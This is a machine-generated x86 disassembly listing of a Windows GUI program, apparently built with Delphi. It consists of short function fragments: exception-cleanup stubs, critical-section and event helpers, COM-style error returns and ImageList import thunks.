retn
sub_417be2
pop ecx
pop edx
pop esi
pop ebx
retn
sub_417c30
jmp sub_4046f8
sub_417c37
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417cf6
jmp sub_4046f8
sub_417cfd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d22
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_417d1b
jmp sub_4046f8
sub_417d22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417d9b
jmp sub_4046f8
sub_417da2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417da8
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_417e01
jmp sub_4046f8
sub_417e08
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417e10
xor eax eax
retn
sub_417e59
jmp sub_4046f8
sub_417e60
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417f91
jmp sub_4046f8
sub_417f98
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418029
jmp sub_4046f8
sub_418030
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4180b0
jmp sub_4046f8
sub_4180b7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418187
jmp sub_4046f8
sub_41818e
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418244
jmp sub_4046f8
sub_41824b
pop ebx
pop ecx
pop ebp
retn
sub_4182d0
jmp sub_4046f8
sub_4182d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182f4
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4182ed
jmp sub_4046f8
sub_4182f4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418380
jmp sub_4046f8
sub_41839d
jmp sub_4046f8
sub_4183a4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4183dc
retn
sub_41845f
jmp sub_4046f8
sub_418466
mov eax [ ebp - 0x8 ]
call sub_41b7b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41848b
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_418484
jmp sub_4046f8
sub_41848b
mov esp ebp
pop ebp
retn
sub_4184db
jmp sub_4046f8
sub_4184e2
pop ebx
pop ecx
pop ebp
retn
sub_418539
jmp sub_4046f8
sub_418540
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418548
retn
sub_4185e7
jmp sub_4046f8
sub_4185ee
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41874b
jmp sub_4046f8
sub_41877d
jmp sub_4046f8
sub_418784
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418841
jmp sub_4046f8
sub_418848
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4188c6
jmp sub_4046f8
sub_4188cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418a45
jmp sub_4046f8
sub_418a4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a69
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_418a62
jmp sub_4046f8
sub_418a69
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418a70
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x1
jne r-xdata
movzx eax [ ebx + 0x5 ]
pop ebx
retn
mov dl 0x2c
mov eax ebx
call sub_418aec
sub_418abc
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x2
jne r-xdata
movzx eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x22
mov eax ebx
call sub_418b34
sub_418ad4
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x10
jne r-xdata
movzx eax [ ebx + 0xe ]
pop ebx
retn
xor edx edx
mov eax ebx
call sub_418b50
sub_418bb0
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
movzx eax [ ebx + 0xd ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_418bc8
sub_418c40
push ebx
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
sub_418cb4
push ebx
cmp [ eax + 0x10 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_418cd0
push ebx
cmp [ eax + 0x10 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_418ed0
mov eax [ eax + 0x20 ]
retn
sub_418ed4
mov eax [ eax + 0x1c ]
retn
sub_418f70
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_4191bc
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_4191f4
mov edx sub_4191d4
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_419340
retn
sub_419638
jmp sub_4046f8
sub_41963f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4196a0
jmp sub_4046f8
sub_4196a7
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4196ec
mov eax [ eax + 0x4 ]
call sub_409ce4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_4196fc
mov eax [ eax + 0x4 ]
call sub_409d10
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_419738
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_419900
jmp sub_4046f8
sub_419960
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_4199f0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a40
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_419d86
jmp sub_4046f8
sub_419d8d
mov esp ebp
pop ebp
retn
sub_419e30
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
retn
sub_419eb8
mov [ eax + 0x18 ] edx
retn
sub_41a034
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_41331c
retn
sub_41a0bb
jmp sub_4046f8
sub_41a0c2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a171
jmp sub_4046f8
sub_41a178
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a340
jmp sub_4046f8
sub_41a392
jmp sub_4046f8
sub_41a3b1
jmp sub_4046f8
sub_41a3b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3d7
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41a3d0
jmp sub_4046f8
sub_41a3d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a47b
jmp sub_4046f8
sub_41a503
jmp sub_4046f8
sub_41a510
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
pop ebx
retn
sub_41a528
mov eax [ rw-data ]
call sub_41a510
retn
sub_41a560
push ebx
call sub_413378
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41a528
sub_41a6de
jmp sub_4046f8
sub_41a6e5
mov eax [ ebp - 0x4 ]
add eax 0x80
call sub_404e44
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41a894
jmp sub_4046f8
sub_41a89b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a9b9
jmp sub_4046f8
sub_41a9d6
jmp sub_4046f8
sub_41a9dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41aadc
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4192c0
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41aba0
push ebx
mov ebx eax
mov eax ebx
call sub_41c62c
cmp al 0x9
sete al
pop ebx
retn
sub_41ac04
jmp sub_4046f8
sub_41ac0b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41ac60
jmp sub_4046f8
sub_41ac67
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41ad10
jmp sub_4046f8
sub_41ad17
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ad30
[ ecx + edx * 2 + 0x41 ]
sub_41af96
jmp sub_404444
sub_41afc2
jmp sub_404444
sub_41b064
jmp sub_404444
sub_41b107
jmp sub_404444
sub_41b2e2
jmp sub_404444
sub_41b324
jmp sub_4046f8
sub_41b354
jmp sub_4046f8
sub_41b35b
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b3cb
jmp sub_4046f8
sub_41b4a2
jmp sub_4046f8
sub_41b4a9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b7b0
mov dl 0x1
call sub_41a5b4
retn
sub_41b8f1
jmp sub_4046f8
sub_41b8f8
pop ebx
mov esp ebp
pop ebp
retn
sub_41b900
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41c73c
mov eax [ rw-data ]
call sub_41a510
pop ebp
retn
sub_41ba9b
jmp sub_404570
sub_41bac2
jmp sub_404570
sub_41bb10
jmp sub_4046f8
sub_41bb17
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bbf7
jmp sub_4046f8
sub_41bbfe
mov esp ebp
pop ebp
retn
sub_41bcb6
jmp sub_4046f8
sub_41bcbd
pop ecx
pop ecx
pop ebp
retn
sub_41bfd0
jmp sub_4046f8
sub_41bfd7
pop ebx
mov esp ebp
pop ebp
retn
sub_41c27e
jmp sub_4046f8
sub_41c285
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403f64
retn
sub_41c2a1
jmp sub_4046f8
sub_41c2c5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_404444
sub_41c2fc
jmp sub_404444
sub_41c33b
jmp sub_4046f8
sub_41c342
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c364
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404e68
retn
sub_41c35d
jmp sub_4046f8
sub_41c364
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c3ed
jmp sub_404444
sub_41c41a
jmp sub_4046f8
sub_41c421
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c42c
push ecx
mov edx esp
mov ecx 0x4
call sub_41ab18
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41a510
sub_41c539
jmp sub_4046f8
sub_41c540
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c61f
jmp sub_4046f8
sub_41c626
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c67c
jmp sub_4046f8
sub_41c683
pop ebx
pop ecx
pop ebp
retn
sub_41c8e1
jmp sub_4046f8
sub_41c8e8
pop ecx
pop ecx
pop ebp
retn
sub_41c929
jmp sub_4046f8
sub_41c930
pop ebx
pop ecx
pop ebp
retn
sub_41c9cc
jmp sub_4046f8
sub_41c9d3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ca81
jmp sub_4046f8
sub_41ca88
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ca94
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_41ccef
jmp sub_4046f8
sub_41ccf6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd1b
mov eax [ ebp - 0x10 ]
call sub_403f64
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_41cd14
jmp sub_4046f8
sub_41cd1b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd40
lea eax [ ebp - 0x8 ]
call sub_406af4
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_41cd39
jmp sub_4046f8
sub_41cd40
pop ebx
mov esp ebp
pop ebp
retn
sub_41cf6a
jmp sub_4046f8
sub_41cf71
pop ebx
mov esp ebp
pop ebp
retn
sub_41cfc4
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_419524
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41cfdc
test dl dl
je r-xdata
mov dl 0x8
call sub_41d174
retn
mov dl 0x9
call sub_41d174
retn
sub_41d064
mov dl 0x1
call sub_41d174
retn
sub_41d06c
xor edx edx
call sub_41d174
retn
sub_41d165
jmp sub_4046f8
sub_41d16c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d1e0
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40f32c
sub_41d214
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41d22c
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41d238
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41d22c
sub_41d254
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_41d260
push rw-data
call InterlockedIncrement
retn
sub_41d26c
push rw-data
call InterlockedDecrement
retn
sub_41d382
jmp sub_404444
sub_41d3c1
jmp sub_4046f8
sub_41d41e
jmp sub_4046f8
sub_41d425
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d444
push rw-data
call LeaveCriticalSection
retn
sub_41d43d
jmp sub_4046f8
sub_41d444
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d491
jmp sub_404444
sub_41d5a2
jmp sub_4046f8
sub_41d5a9
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41d63c
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_41d988
sub_41d6b6
jmp sub_4046f8
sub_41d6bd
pop ebx
mov esp ebp
pop ebp
retn
sub_41d6dc
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41d6f0
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_41d6dc
call sub_41d960
sub_41d7b6
jmp sub_4046f8
sub_41d7bd
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41d8f4
jmp sub_4046f8
sub_41d913
jmp sub_4046f8
sub_41d93a
jmp sub_4046f8
sub_41d9b0
mov [ eax + 0xd ] 0x1
retn
sub_41db24
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41dd10
sub_41db84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b700
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41db98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b700
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41dbac
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41cff0
retn
sub_41dbb8
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41cff0
retn
sub_41de74
xor eax eax
retn
sub_41de78
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41de80
xor eax eax
retn
sub_41de84
retn
sub_41de88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404e98
pop esi
pop ebx
retn
sub_41de9c
mov eax [ eax + 0x4 ]
retn
sub_41dea0
retn
sub_41dea4
xor eax eax
retn
sub_41dea8
retn
sub_41deac
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41deb8
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41dec4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41ded0
retn
sub_41ded4
xchg edx eax
call sub_41b370
retn
sub_41dedc
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41df64
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_404160
pop esi
retn
sub_41df78
retn
sub_41e05c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
sub_41e09c
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41e1e8
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4041ac
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41e200
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41e288
retn
sub_41e2d0
retn
sub_41e308
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41e320
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41e54c
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_404160
pop esi
pop ebx
retn
sub_41e368
mov al 0x1
retn
sub_41e36c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41e374
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41e424
xor eax eax
retn
sub_41e428
retn
sub_41e454
retn
sub_41e4ec
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41e500
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_416668
retn
sub_41e64b
jmp sub_404444
sub_41e650
mov ebx 0x1
call sub_404854
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41e6b3
jmp sub_404444
sub_41e6b8
mov ebx 0x80030103
call sub_404854
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41e736
jmp sub_404444
sub_41e73b
mov ebx 0x80030009
call sub_404854
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41e799
jmp sub_404444
sub_41e79e
mov ebx 0x8000ffff
call sub_404854
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41e96f
jmp sub_4046f8
sub_41e980
jmp sub_404444
sub_41e985
mov [ ebp - 0x4 ] 0x8000ffff
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9ae
lea eax [ ebp + 0xc ]
call sub_406af4
retn
sub_41e9a7
jmp sub_4046f8
sub_41e9ae
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41e9bc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41e9c8
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41e9d4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41e9e0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41ea4f
jmp sub_404444
sub_41ea54
mov esi 0x8000ffff
call sub_404854
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41ea68
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41ead5
jmp sub_4046f8
sub_41eadc
mov eax [ rw-data ]
call sub_403f64
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41eaec
call sub_415fb0
retn
sub_41ebb4
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41ed58
jmp sub_4046f8
sub_41ed5f
pop ebp
retn
sub_41ef9c
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4167c8
retn
sub_41efd0
mov eax [ eax + 0x4 ]
call sub_416668
retn
sub_41f16d
add eax 0xffffffd8
jmp sub_41ff98
sub_41f175
add eax 0xffffffd8
jmp sub_41ffac
sub_41f187
add [ esp + 0x4 ] 0xffffffd8
jmp sub_406bc8
sub_41f191
add [ esp + 0x4 ] 0xffffffd8
jmp sub_406bdc
sub_41f19b
add eax 0xffffffd4
jmp sub_41fe88
sub_41f1ab
add eax 0xffffffd4
jmp sub_41f9e0
sub_41f1b3
add eax 0xffffffd4
jmp sub_41fc88
sub_41f1dd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_406bc8
sub_41f1e7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_406bdc
sub_41f328
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f38c
mov [ rw-data ] eax
sub_41f59d
jmp sub_4046f8
sub_41f602
jmp sub_4046f8
sub_41f609
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f6f5
jmp sub_4046f8
sub_41f6fc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f917
jmp sub_4046f8
sub_41f93c
jmp sub_4046f8
sub_41f943
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f9c0
jmp sub_4046f8
sub_41f9c7
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fbf5
jmp sub_4046f8
sub_41fc59
jmp sub_4046f8
sub_41fc60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fc88
call sub_41f470
retn
sub_41fd4f
jmp sub_4046f8
sub_41fd56
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fdb6
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
sub_41fdbf
jmp sub_4046f8
j_sub_41fdb6
jmp sub_41fdb6
sub_41fdc6
pop ebx
pop ecx
pop ebp
retn
sub_41fe76
jmp sub_4046f8
sub_41fe7d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_41ff72
jmp sub_4046f8
sub_41ff79
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ff84
or [ edi + 0x5e496941 ] ecx
cdq
dec eax
sahf
adc ebx [ edi + 0x7549c1e3 ]
mov ax [ eax + 0x20 ]
retn
sub_41ff98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_404e98
pop esi
pop ebx
retn
sub_4200d3
jmp sub_4046f8
sub_4200da
pop ebp
retn
sub_420199
jmp sub_4046f8
sub_4201a0
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4207b4
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4201c0
mov [ rw-data ] sub_4202d8
mov [ rw-data ] sub_420248
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_4204dc
mov [ rw-data ] sub_4205b0
mov [ rw-data ] sub_420684
retn
sub_420845
jmp sub_4046f8
sub_42084c
pop ebp
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
_TrackMouseEvent
jmp [ _TrackMouseEvent@IAT ]
sub_4208f1
out 0x4a eax
add [ esi - 0x1 ] dh
add [ eax ] al
hlt
sub_420c84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_420d14
push ebx
mov ebx eax
test ebx ebx
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx ] 0x5c
jne r-xdata
xor eax eax
pop ebx
retn
sub_420fc9
jmp sub_4046f8
sub_420fd0
movzx eax [ ebp - 0x6 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421182
jmp sub_4046f8
sub_421189
movzx eax [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4212c0
jmp sub_4046f8
sub_42130a
jmp sub_4046f8
sub_421311
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_421458
jmp sub_4046f8
sub_42145f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421520
jmp sub_4046f8
sub_421527
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42180a
jmp sub_4046f8
sub_421811
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421870
jmp sub_4046f8
sub_421877
pop ebp
retn
sub_422299
add eax 0xffffffd8
jmp sub_426404
sub_4222a1
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_4227d0
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_4228b8
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_42292c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422938
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422a18
jmp sub_4046f8
sub_422a1f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422ab0
jmp sub_4046f8
sub_422b55
jmp sub_4046f8
sub_422b5c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422b64
retn
sub_422bc4
jmp sub_4046f8
sub_422bcb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422bd4
cmp [ edx + 0x1d ] 0x0
je r-xdata
retn
lea eax [ edx + 0x18 ]
call sub_40f8bc
sub_422c44
jmp sub_4046f8
sub_422c4b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422cf1
jmp sub_4046f8
sub_422cf8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423150
push 0x33
mov ecx rw-data
call sub_416270
retn
sub_423160
push 0x33
mov ecx rw-data
call sub_416230
retn
sub_423170
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_423194
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_423368
push 0x11
mov ecx rw-data
call sub_416230
retn
sub_4234b4
push ebx
mov ebx eax
mov eax ebx
call sub_423170
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42356e
jmp sub_4046f8
sub_423575
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423194
retn
sub_42358b
jmp sub_4046f8
sub_4235a4
push esi
push edi
